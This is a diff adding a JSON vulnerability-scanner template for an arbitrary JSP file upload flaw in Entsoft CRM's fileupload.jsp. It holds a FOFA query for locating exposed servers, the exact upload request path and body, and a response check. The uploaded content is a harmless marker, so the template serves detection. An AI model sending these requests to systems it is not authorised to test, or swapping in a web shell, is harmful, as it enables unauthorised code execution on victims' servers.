@@ -1,0 +1,36 @@
+{
+  "product": "浙大恩特CRM",
+  "vul_name": "浙大恩特CRM fileupload.jsp任意文件上传",
+  "type": "文件上传",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "浙大恩特客户资源管理系统中的fileupload.jsp接口存在安全漏洞，允许攻击者向系统上传任意恶意JSP文件，从而可能导致潜在的远程执行代码攻击。该漏洞可能会对系统的完整性和安全性产生严重影响。",
+  "version": "",
+  "note": "访问系统抓包，查看响应包中是否回显上传路径，访问返回的文件路径，成功上传。",
+  "search": {
+    "FOFA": "app=\"浙大恩特客户资源管理系统\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/qq_56698744/article/details/134393281",
+  "fix": [
+    "多装一些安全设备，或者打补丁，升级系统等"
+  ],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/entsoft_en/entereditor/jsp/fileupload.jsp?filename=52e039302a62d077.jsp",
+      "data": "95cc64dd2825f9df13ec4ad683ecf339"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "52e039302a62d077.jsp"
+        }
+      ]
+    }
+  }
+}
